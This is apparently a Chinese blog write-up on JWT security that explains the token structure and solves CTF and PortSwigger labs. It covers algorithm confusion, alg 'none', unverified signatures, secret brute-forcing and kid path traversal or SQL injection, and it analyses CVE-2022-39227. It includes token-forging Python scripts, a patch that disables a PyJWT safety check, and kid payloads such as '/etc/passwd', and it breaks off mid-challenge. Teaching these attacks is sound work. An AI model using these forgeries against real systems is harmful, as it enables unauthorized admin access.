# 前言

在2022祥云杯时遇到有关JWT的题，当时没有思路，对JWT进行学习后来对此进行简单总结，希望能对正在学习JWT的师傅们有所帮助。

# JWT

JWT，即`JSON WEB
TOKEN`，它是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，是一种标准化的格式，用于在系统之间发送经过加密签名的JSON数据，理论上可以包含任何类型的数据，但最常用于发送关于用户的信息（“声明”），以进行身份认证、会话处理和访问控制。

简单了解了它的定义后，我们接下来来看一下JWT的组成部分它分为三个部分，如下所示

    
    
    1、Headers:头部  
    2、Payload:有效载荷  
    3、Signature:签名

这三个部分以`.`符号来连接，所以JWT的格式通常是`xxx.yyy.zzz`这种样子

## Headers

`Headers`通常由两部分组成，`令牌的类型`和`签名算法`，常见的算法有很多种，例如 `HMAC SHA256`或
`RSA`。但它也还有一个`kid`参数，这是一个可选参数，全称是`key ID`，它用于指定加密算法的密钥。

示例如下

    
    
    ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9

这就是一个`Headers`，当我们对它进行Base64解码就可以看到它的具体内容，具体如下

    
    
    {  
    "alg": "HS256",  
    "typ": "JWT"  
    }

`alg`指的就是算法，这里的算法就是`HS256`，`typ`指的是令牌类型。这里需要说明一点，就是明文在加密时其实采用的是`Base64URL`加密，这种加密方式并非`Base64encode`+`URLencode`，而是对一些特殊字符进行了替换，具体说明如下

> JWT 作为一个令牌(token)，有些场合可能会放到 URL(比如
> api.example.com/?token=xxx)。Base64有三个字符+、/和=，在 URL
> 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。

## Payload

有效载荷就是存放有效信息的地方，其中包含声明。声明包含三个部分 1、 **已注册声明** 这个部分的话就是已经预先定义过的声明，常见的声明主要有以下几种

    
    
    iss: jwt签发者  
    sub: jwt所面向的用户  
    aud: 接收jwt的一方  
    exp: jwt的过期时间，这个过期时间必须要大于签发时间  
    nbf: 定义在什么时间之前，该jwt都是不可用的.  
    iat: jwt的签发时间  
    jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。

2、 **公共的声明** 这些可以由使用 JWT
的人随意定义，一般用于添加用户的相关信息或其他业务需要的必要信息。但不建议添加敏感信息，因为该部分在客户端可进行解码.3、 **私有的声明**
这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。

示例如下

    
    
    ewoJInN1YiI6ICJhZG1pbiIsCiAgICAidXNlcl9yb2xlIiA6ICJhZG1pbiIsCiAgICAiaXNzIjogImFkbWluIiwKICAgICJpYXQiOiAxNTczNDQwNTgyLAogICAgImV4cCI6IDE1NzM5NDAyNjcsIAogICAgIm5iZiI6IDE1NzM0NDA1ODIsIAogICAgImp0aSI6ICJkZmY0MjE0MTIxZTgzMDU3NjU1ZTEwYmQ5NzUxZDY1NyIgICAKfQ

进行`base64URL`解码，结果如下

    
    
    {  
    "sub": "admin",             //jwt所面向的用户  
    "user_role" : "admin",      //当前登录用户  
    "iss": "admin",             //该JWT的签发者,有些是URL  
    "iat": 1573440582,        //签发时间  
    "exp": 1573940267,        //过期时间  
    "nbf": 1573440582,        //该时间之前不接收处理该Token  
    "jti": "dff4214121e83057655e10bd9751d657"   //Token唯一标识  
    }

## Signature

由于头部和有效载荷以明文形式存储，因此，需要使用签名来防止数据被篡改。所以这部分是一个签证信息，这个签证信息由三部分组成

    
    
    1、header (base64URL编码)  
    2、payload (base64URL编码)  
    3、secret（密钥）

它的计算方式如下

    
    
    Signature=HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)  
    //假设这里是HS256算法，如果是其他算法的话开头设置为其他算法即可

现在了解了JWT的大致作用和其组成，接下来来学习一下JWT攻击。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

# JWT 攻击

JWT攻击有多种情况，现在来对其进行逐一讲解。

## 敏感信息泄露

> JWT保证的是数据传输过程中的完整性而不是机密性。

因为JWT的`payload`部分是使用`Base64url`编码的，所以它其实是相当于明文传输的，当`payload`中携带了敏感信息时，我们对`payload`部分进行`Base64url`解码，就可以读取到`payload中`携带的敏感信息。

### 靶场演示

题目链接<https://www.ctfhub.com/#/skilltree>题目描述如下

> JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}

进入环境后发现一个登录框

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921858_63983e822658bdce02062.png!small)

随便输入账号密码，登录后发现界面如下

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921858_63983e82bb529f5b91fab.png!small)

查看此时的JWT

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921859_63983e8375b84d429898d.png!small)

想到题目中说头部和载荷可能会有敏感泄露，将值取出分别进行`Base64URL`解码

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921860_63983e84360b9fd9c33bf.png!small)

两处拼接一下，得到`ctfhub{bb89d985db8cea6a2f2d34cb}`

## 算法修改攻击

首先来简述一下JWT中两个常用的加密算法

>
> HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。

从上面不难看出，`HS256`自始至终只有一个密钥，而`RS256`是有两个密钥的。在通常情况下，`HS256`的密钥我们是不能取到的，`RS256`的密钥也是很难获得的，`RS256`的的公钥相对较容易获取，但无论是`HS256`加密还是`RS256`加密，都是无法实现伪造JWT的，但当我们修改`RSA256`算法为`HS256`算法时，后端代码会使用公钥作为密钥，然后用`HS256`算法验证签名，如果我们此时有公钥，那么此时我们就可与实现JWT的伪造。

### 靶场演示

题目链接<https://www.ctfhub.com/#/skilltree>

题目描述

>
> 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。

进入环境后发现题目代码

    
    
    class JWTHelper {  
    public static function encode($payload=array(), $key='', $alg='HS256') {  
    return JWT::encode($payload, $key, $alg);  
    }  
    public static function decode($token, $key, $alg='HS256') {  
    try{  
    $header = JWTHelper::getHeader($token);  
    $algs = array_merge(array($header->alg, $alg));  
    return JWT::decode($token, $key, $algs);  
    } catch(Exception $e){  
    return false;  
    }  
    }  
    public static function getHeader($jwt) {  
    $tks = explode('.', $jwt);  
    list($headb64, $bodyb64, $cryptob64) = $tks;  
    $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));  
    return $header;  
    }  
    }  
    ​  
    $FLAG = getenv("FLAG");  
    $PRIVATE_KEY = file_get_contents("/privatekey.pem");  
    $PUBLIC_KEY = file_get_contents("./publickey.pem");  
    ​  
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {  
    if (!empty($_POST['username']) && !empty($_POST['password'])) {  
    $token = "";  
    if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){  
    $jwt_payload = array(  
    'username' => $_POST['username'],  
    'role'=> 'admin',  
    );  
    $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');  
    } else {  
    $jwt_payload = array(  
    'username' => $_POST['username'],  
    'role'=> 'guest',  
    );  
    $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');  
    }  
    @setcookie("token", $token, time()+1800);  
    header("Location: /index.php");  
    exit();  
    } else {  
    @setcookie("token", "");  
    header("Location: /index.php");  
    exit();  
    }  
    } else {  
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {  
    $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);  
    if ($obj->role === 'admin') {  
    echo $FLAG;  
    }  
    } else {  
    show_source(__FILE__);  
    }  
    }  
    ?>

  

简单的看一下，大致意思就是当以用户名为`admin`，密码不是`$flag`时，此时登录后JWT中`payload`的`role`是`guest`，而只有当`role`为`admin`时才能够得到Flag，所以我们这里肯定是需要伪造JWT的，我们先以`admin`为用户名，随便输入密码登录一下此时得到JWT，将其拿去解密网站[https://jwt.io](https://jwt.io/)解密一下

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921861_63983e8558e4b073ce7c8.png!small)

  

发现加密方式是RS256非对称加密，想到在登录时，下方给出了公钥

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921862_63983e8654fc20ec2fa53.png!small)

所以这里就可以尝试更改算法为`HS256`，以公钥作为密钥来进行签名和验证，因此我们构造一个伪造JWT的脚本，内容如下

    
    
    import jwt  
    import base64  
    ​  
    public ="""-----BEGIN PUBLIC KEY-----  
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqizf1rnxqfeyCAp52TQO  
    3uEyeB1HzqqbO8FBHWqLlhgmyPFqaopXVhZryzP+Sd6a3iQd8xeD7URswPHE4roA  
    kbI1GMta9zAdD1yPtp//JNZ55hx1iFY2n9gw2u8VL64n9sCc56H46L3W52Z37kvW  
    q5LuoLAuyJpP7Ofadt7biWaeXibZGQjPwlbCy31DyxdDFCt8pVrajVI97w3amHBU  
    Xhd0Ku+DOq9hjadtQbTkbIkAUR84yqt+25EXd/rg1w8we9ysNcTjAeUayRGPuQmX  
    UWJaFpsvuL7WeUb2xJqvieFwsCQppS1ZgaoRc0F835K+G3s3qWRi4AnvZxryfTzl  
    awIDAQAB  
    -----END PUBLIC KEY-----  
    """  
    payload={ "username": "admin","role": "admin"}  
    print(jwt.encode(payload, key=public, algorithm='HS256'))

此时运行完后发现报错

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921863_63983e870b4d6a4657e61.png!small)

这个是因为源代码中进行了校验，我们简单设置一下即可,源代码文件地址如下

    
    
    /usr/lib/python3/dist-packages/jwt/algorithms.py

我们在它的校验前面增加这样一句话

    
    
    invalid_strings=[]

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921864_63983e8895a9323849073.png!small)

此时保存退出，再运行文件即可得到新JWT

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921866_63983e8a238aa3df84c58.png!small)

  

将新的JWT拿到网站中替换旧的JWT，刷新网站即可得到flag

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921866_63983e8ae1b537cbb279b.png!small)

## 未验证签名

当用户端提交请求给应用程序，服务端可能没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制，此时就造成了越权漏洞的出现。假设现有payload如下

    
    
    {   
    "iat": 1668871293,  
    "exp": 1668878493,  
    "nbf": 1668871293,  
    "sub": "quan9i",  
    }

这里的`quan9i`是普通用户，按理说的话它是无法访问到管理员的界面的，但由于这里的签名是没有验证的，当我们修改`payload`时，这个JWT仍然有效，所以我们修改payload如下

    
    
    {   
    "iat": 1668871293,  
    "exp": 1668878493,  
    "nbf": 1668871293,  
    "sub": "admin",  
    }

此时就垂直越权，变成了管理员用户，可以访问管理员的界面。

### 靶场演示

题目环境<https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature>题目描述

> 本实验使用基于 JWT 的机制来处理会话。由于实施缺陷，服务器不会验证它收到的任何 JWT 的签名。

题目要求

> 要解决实验室问题，请修改您的会话令牌以获取对管理面板的访问权限/admin，然后删除用户carlos。

题目条件

> 您可以使用以下凭据登录到您自己的帐户：wiener:peter

打开环境后发现Cookie中没什么东西，但想到题目给出了账号，那就先找登录点，发现有个`My account`

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921867_63983e8bc22dd2612b375.png!small)

  

点击查看，发现是登录界面，将刚刚题目条件中所给的用户名和密码放入

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921868_63983e8cd78c07611e922.png!small)

此时查看cookie

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921869_63983e8d9315e5795e944.png!small)

具体内容为

    
    
    eyJraWQiOiIxYmE5NjA0Ny0wNjBiLTQ0MTAtODg1NC01YWYxYTQ2ZTljYWEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTI5NzgxMH0.JMb3Ttl7WLoVrTfcEq03VIafh7zDMu5_nhMtPc3qnhgENSl1WbMAMFfeTa-v0jS69A13W-J3_ccslHu25OW_SRPAq2GuAUoFfEGtthnP-PaDWFN2_UIIcaeAx8rj8bNy65apX37EnTx-sPo274XjW9hQgTRLT1ifHtfihvTzoOY94_2bLaR4JwSUoyoi_kXZW4IndvhqpHA2kn8jw2aQOJCCCjeHh2r_CDDQA1hrSKeP2FgIq07wagLZqzkG6ATexINTNI_4jwpO8Jy1U-l0voPQQ6g111GCkBDhhkCagnm4zh-_Kl2nDD-Xjp74VVZDCNojbLoeS2Y6RGPZ4GR28w

对第一个`.`后和第二个`.`之前的内容进行解码（此部分内容为有效载荷）得到

    
    
    {"iss":"portswigger","sub":"wiener","exp":1669297810}

题目提示了这里不校验签名，所以我们修改payload如下

    
    
    {"iss":"portswigger","sub":"administrator","exp":1669297810}

再对其进行`Base64URL`编码，替换掉原来的`payload`，此时就得到了新的JWT，将新的JWT放入`session`中，重新访问此界面，发现多了一个功能点

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921870_63983e8e634c11837be39.png!small)

发现可以删除用户

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921871_63983e8f21a5f00663c95.png!small)

任务完成。

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921871_63983e8fc900d0cbe2b9b.png!small)

  

## 空加密算法

这里需要先介绍一些利用的知识点

>
> 将signature置空。利用node的jsonwentoken库已知缺陷：当jwt的signature为null或undefined时，jsonwebtoken会采用algorithm为none进行验证

JWT支持使用空加密算法，可以在header中指定`alg`为`none`，此时只要把`signature`设置为空，提交到服务器，任何token都可以通过服务器的验证。

假设现有JWT(解码后的，无`signature`的)如下

    
    
    {  
    "alg" : "Hs256",  
    "typ" : "jwt"  
    }  
    ​  
    {  
    "user" : "quan9i"  
    }

这里我们指定`alg`为`None`，修改Payload中的`user`为`admin`，如下所示

    
    
    {  
    "alg" : "None",  
    "typ" : "jwt"  
    }  
    ​  
    {  
    "user" : "admin"  
    }

此时再进行`Base64URL`编码，就可以实现越权，得到管理员才可以访问的界面。

### 靶场演示

靶场环境<https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification>题目描述

> 本实验使用基于 JWT 的机制来处理会话。服务器未安全地配置为接受未签名的 JWT。

题目要求

> 要解决实验室问题，请修改您的会话令牌以获取对管理面板的访问权限/admin，然后删除用户carlos。

题目条件

> 您可以使用以下凭据登录到您自己的帐户：wiener:peter

进入环境后先去登录

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921872_63983e908bd058541f381.png!small)

  

得到JWT，题目提示了接受未签名的JWT，所以将第二个点后的内容直接删除，而后再对前面内容进行`Base64`解码

    
    
    {"kid":"16adc077-c753-4bbe-a9df-46688c01ac46","alg":"RS256"}.{"iss":"portswigger","sub":"wiener","exp":1669304815}.

修改`headers`中的`alg`为`none`，修改payload中的`sub`为`administrator`，然后分别进行`Base64URL`编码，即可得到新的JWT，在网站中对JWT进行替换，接下来再次访问此网站，发现新功能点。

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921873_63983e9173004b24e5f89.png!small)

  

点进去发现有删除用户的功能

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921874_63983e92524e8b0bbfa02.png!small)

  

任务完成。

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921875_63983e9306d3474725e00.png!small)

## 爆破密钥

这个的话其实就是使用工具来对密钥进行爆破，从而实现越权。这个的话在参考过其他师傅的文章后发现是有一些条件的，具体如下所示

    
    
    1、JWT使用的加密算法是HS256加密算法  
    2、一段有效的、已签名的token  
    3、签名用的密钥不复杂（弱密钥）

然后这里还需要介绍一下爆破密钥用的工具，链接如下<https://github.com/brendan-rius/c-jwt-cracker>安装方式如下所示

    
    
    1、git clone https://github.com/brendan-rius/c-jwt-cracker #下载  
    2、make #编译

使用方式如下

    
    
    ./jwtcrack JWT 

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921875_63983e93c88fdf336dfbf.png!small)

这是一个，还有一个爆破工具，可以引用字典，链接如下<https://github.com/Sjord/jwtcrack>安装方式如下所示

    
    
    1、git clone https://github.com/Sjord/jwtcrack   
    2、pip install PyJWT tqdm

它的使用方式如下

    
    
    python3 crackjwt.py JWT dictionary.txt //字典文件是自己写入的

### 靶场演示

题目描述

> 本实验使用基于 JWT 的机制来处理会话。它使用极弱的密钥来签署和验证令牌。这可以很容易地使用一个包含常见secret的单词表来暴力破解。

题目要求

> 要解决实验室问题，请首先暴力破解网站的密钥。获得此后，使用它签署修改后的会话令牌，使您可以访问管理面板/admin，然后删除用户carlos

题目条件

> 您可以使用以下凭据登录到您自己的帐户：wiener:peter

进入环境后，依旧是先登录获取当前JWT

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921876_63983e94ca09a27a353e3.png!small)

因为题目已经提示了这里用的是暴力破解，所以我们用刚刚提到的工具，来爆破一下密钥

    
    
    ./jwtcrack eyJraWQiOiIyZjRlMzM0Yy1lMzZjLTRhNWQtOWVjYi03ZDhkZDJhYThlYjMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTMwNzYwNn0.iMBR0rqiUQKT1a1YoonpXNY5hCNz16okJB9tbog0QRE

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921877_63983e95c6471305aeae3.png!small)

这里爆破多次均未得到密钥，所以我们选择换另一个工具，自己找个字典来进行爆破字典链接<https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list>接下来使用工具指定字典来进行爆破

    
    
    python3 crackjwt.py  eyJraWQiOiIyZjRlMzM0Yy1lMzZjLTRhNWQtOWVjYi03ZDhkZDJhYThlYjMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTMwNzYwNn0.iMBR0rqiUQKT1a1YoonpXNY5hCNz16okJB9tbog0QRE dictionary.txt

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921879_63983e9799f057ac9649e.png!small)

得到密钥为`secret1`进入解码网站[https://jwt.io](https://jwt.io/),对jwt进行解码![在这里插入图片描述](https://image.3001.net/images/20221213/1670921880_63983e9897bb5f9e4dd57.png!small)

修改payload中的`sub`为`administrator`，再在下方写入密钥`secret1`，生成新JWT![在这里插入图片描述](https://image.3001.net/images/20221213/1670921881_63983e9970939020ce60b.png!small)

拿到网站中替换原JWT，发现新功能点

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921882_63983e9a616675170ad57.png!small)

访问后发现可以删除用户

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921883_63983e9b560c04944f8c6.png!small)

任务完成。

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921884_63983e9c212e1b1d1014e.png!small)

  

## Kid参数注入

前文在简述`Headers`提到，它还有一个可选参数`kid`，当`Headers`中存在这个参数时，我们可以通过修改这个参数实现目录遍历、SQL注入等攻击

    
    
    #目录遍历  
    {  
    "kid" : "/etc/passwd"  
    }

Kid参数的逻辑是类似于`sql="select * from table where kid=$kid"`这种，所以它是存在SQL注入漏洞的，示例如下

    
    
    #sql注入  
    {  
    "kid" : "0 union select 123"  
    }

此时它的Kid就被我们恶意篡改为123，此时就相当于拿到了Key，可以伪造JWT，实现越权。

### 靶场演示

靶场地址<https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal>题目描述

> 本实验使用基于 JWT 的机制来处理会话。为了验证签名，服务器使用JWTkid标头中的参数从其文件系统中获取相关密钥

题目要求

> 要解决实验室问题，请伪造一个 JWT，使您可以访问管理面板/admin，然后删除用户carlos。

题目条件

> 您可以使用以下凭据登录到您自己的帐户：wiener:peter

进入环境后，登录获取JWT安装插件

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921884_63983e9cf044033088329.png!small)

安装后选择`New Symmetric Key`，生成一个Key

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921885_63983e9db3e8c327b8d9a.png!small)

接下来修改`K`参数为`AA==`，点击确认抓靶场的包

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921886_63983e9e5f50747d1b355.png!small)

点击下面的`sign`

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921887_63983e9f150c77611096f.png!small)

将此时的JWT去替换网站的JWT，再刷新网站

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921887_63983e9fbe2b53a401fb9.png!small)

成功越权

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921888_63983ea0a9af4bd7a9149.png!small)

  

简单说一下这里的原理：这里其实就是利用了kid的目录遍历攻击，我们将kid参数指向标准文件`/dev/null`，此时我们再利用bp的工具设置一个空的签名密钥，就实现了越权，成功得到管理员权限。

同时，这个Kid是Headers的一部分，`Headers`其实还有两个不常用的参数，即`Jwk`和`Jku`，这两个的话也是存在漏洞的，他们的攻击方式同`Kid`是较为相似的，所以这里不再去演示如何攻击。靶场环境如下，有兴趣的师傅可以看看。<https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection><https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection>

# JWT攻击实例

## CVE-2022-39227

这个的话并没有给出具体的POC，但是官方在commit中最下方给出了测试代码[https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9](https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9#diff-f3fb6499354e6fd16cb955d1f54138fa3481148f3f095467958b60b3835f3a50)具体代码如下所示

    
    
    """ Test claim forgery vulnerability fix """  
    from datetime import timedelta  
    from json import loads, dumps  
    from test.common import generated_keys  
    from test import python_jwt as jwt  
    from pyvows import Vows, expect  
    from jwcrypto.common import base64url_decode, base64url_encode  
    ​  
    @Vows.batch  
    class ForgedClaims(Vows.Context):  
    """ Check we get an error when payload is forged using mix of compact and JSON formats """  
    def topic(self):  
    """ Generate token """  
    payload = {'sub': 'alice'}  
    return jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))  
    ​  
    class PolyglotToken(Vows.Context):  
    """ Make a forged token """  
    def topic(self, topic):  
    """ Use mix of JSON and compact format to insert forged claims including long expiration """  
    [header, payload, signature] = topic.split('.')  
    parsed_payload = loads(base64url_decode(payload))  
    parsed_payload['sub'] = 'bob'  
    parsed_payload['exp'] = 2000000000  
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))  
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'  
    ​  
    class Verify(Vows.Context):  
    """ Check the forged token fails to verify """  
    @Vows.capture_error  
    def topic(self, topic):  
    """ Verify the forged token """  
    return jwt.verify_jwt(topic, generated_keys['PS256'], ['PS256'])  
    ​  
    def token_should_not_verify(self, r):  
    """ Check the token doesn't verify due to mixed format being detected """  
    expect(r).to_be_an_error()  
    expect(str(r)).to_equal('invalid JWT format')

重点在中间部分，也就是这里

    
    
    def topic(self, topic):  
    """ Use mix of JSON and compact format to insert forged claims including long expiration """  
    [header, payload, signature] = topic.split('.')  
    parsed_payload = loads(base64url_decode(payload))  
    parsed_payload['sub'] = 'bob'  
    parsed_payload['exp'] = 2000000000  
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))  
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

可以看到这里的话首先是对JWT进行了拆分，我们知道JWT的格式是`xxx.yyy.zzz`，这个以`.`来分离，那就是把三部分拆分开来，分别赋值给了`header`、`payload`和`signature`，接下来将进行了`base64URL`以及`json`解码的`payload`赋值给了`parsed_payload`，而后将新内容`sub=bob`以及`exp=2000000000`放入了`parsed_payload`中，将进行过`Base64`编码和`json`编码的`parsed_payload`赋值给了`fake_payload`，最终生成的JWT格式如下

    
    
    {" header.fake_payload.":"","protected":"header", "payload":"payload","signature":"signature"}

此时就完成了JWT的伪造。

那么这个漏洞是如何产生的呢？接下来我们看一下源文件。查看`python_jwt/__init__.py`文件

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921889_63983ea188c7b25d8f1ba.png!small)

首先看到 `header, claims, _ =
jwt.split('.')`，它按`.`进行拆分，如何分别将三部分赋值给`headers`,`claims`以及`_`。接下来就是对头部进行解码，而后检验头部算法，后面也是校验属性的，接下来走到JWS这里

    
    
    if pub_key: #验证是否传入密钥  
    token = JWS()  
    token.allowed_algs = allowed_algs  
    token.deserialize(jwt, pub_key) # 传入整个用户的JWT，JWS对JWT进行反序列化处理  
    parsed_claims = json_decode(token.payload) # JWS对传入部分进行json解码

跟进反序列化，看它是怎么做的

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921890_63983ea2c2115ee0e4382.png!small)

这里的话就是首先尝试对传入的JWT进行解析，我们知道这里传入的是完整的原始JWT，而非拆分后的某个部分，JWT的格式是`xxx.yyy.zzz`这种，而json能解析的是`{"a":1,"b":2,"c":3,"d":4,"e":5}`这种格式的，所以它无疑会走向`except
ValueError`这里，然后它对值进行拆分，分别赋给`protected`、`payload`和`signature`，然后就将`o`赋值给了`self.objects`，这里的话还有一个`verify(key,alg)`函数，我们跟进一下

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921891_63983ea3b02f6fee34ee9.png!small)

这里可以看到它其实是对JWT的各部分内容进行了一个检验，它这里检验的是原来的完整的JWT，所以这个肯定是没有问题的，这个验证肯定是可以通过的。

我们此时回到`__init__.py`

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921892_63983ea487a9bf3a444af.png!small)

发现这里在校验过后，后面都没有再用到`token`这个，后面是对`header`和`claims`中的一些参数进行校验，然后将`parsed_header`和`parsed_claims`值返回了。这里就是问题所在，
在对整个JWT进行校验过后，没有返回校验过的数据，而是返回一开始进行点分过后的数据。

我们的恶意payload如下所示

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921893_63983ea55a8a42ae72a4b.png!small)

此时拆分后他一直在校验的是后面的灰色部分，这部分是原始的JWT，校验肯定是可以通过的，而我们最终返回的数据是前面的`forged_payload`,所以无论前面怎么添加，怎么替换，校验都是可以通过的。此时你再去看官方给出的测试代码就可以理解它的思路了。

# CTF实战

## CTFshow系列

### Web345

打开靶场，进入环境

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921894_63983ea6110bc7925a9e1.png!small)

看一下源代码

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921894_63983ea6da26bcfa0f188.png!small)

提示了admin界面，先记着。同时刚刚发现cookie含有JWT，放入网站<https://jwt.io/>中查看一下

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921895_63983ea7a6d44a52b0d39.png!small)

加密方式为空加密，所以这里的话，我们base64解码一下，然后直接修改`sub`为`admin`，再进行base64编码，放入cookie中即可，接下来访问admin界面

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921896_63983ea8a6970990ff81c.png!small)

  

### web346

这里进入环境后，接下来进入靶场，看一下JWT，用解密网站解密一下

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921897_63983ea9900aa19820edb.png!small)

发现有了加密格式，然后这里存在一种漏洞就是可以把加密方式换成空加密来绕过，但是这个网站是不能直接修改的，我们这里可以借助python脚本实现，脚本如下所示

    
    
    import time  
    import jwt  
    ​  
    # payload  
    token_dict={  
    "iss": "admin",  
    "iat": 1668871293,  
    "exp": 1668878493,  
    "nbf": 1668871293,  
    "sub": "admin",  
    "jti": "9892b9d99098ba229891bedcfa856b61"  
    }  
    ​  
    # headers  
    headers = {  
    "alg": "none",  
    "typ": "JWT"  
    }  
    ​  
    jwt_token = jwt.encode(token_dict,  # payload, 有效载体   
    key='',  
    headers=headers,  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)  
    algorithm="none",  # 指明签名算法方式, 默认也是HS256  
    )  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str  
    ​  
    print(jwt_token)  
    ​

> 注:这里安装jwt模块的时候，安装的模块是PyJWT模块，同时不要给脚本名字命名为jwt.py，否则运行脚本时就会发生报错。

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921899_63983eab0a9a3df87a8df.png!small)

接下来运行脚本

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921900_63983eac1df496eb1d8eb.png!small)

得到JWT

    
    
    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2ODg3MTI5MywiZXhwIjoxNjY4ODc4NDkzLCJuYmYiOjE2Njg4NzEyOTMsInN1YiI6ImFkbWluIiwianRpIjoiOTg5MmI5ZDk5MDk4YmEyMjk4OTFiZWRjZmE4NTZiNjEifQ.

去靶场中替换一下，同时访问`admin`界面

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921901_63983ead1fbed376a878d.png!small)

### Web347

  

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921902_63983eae03995e9581830.png!small)

提示弱口令，这里应该说的是密钥，先记着进入环境后找到JWT去对应网站解码

![在这里插入图片描述](https://image.3001.net/images/20221213/1670921902_63983eaebf39f7136426c.png!small)

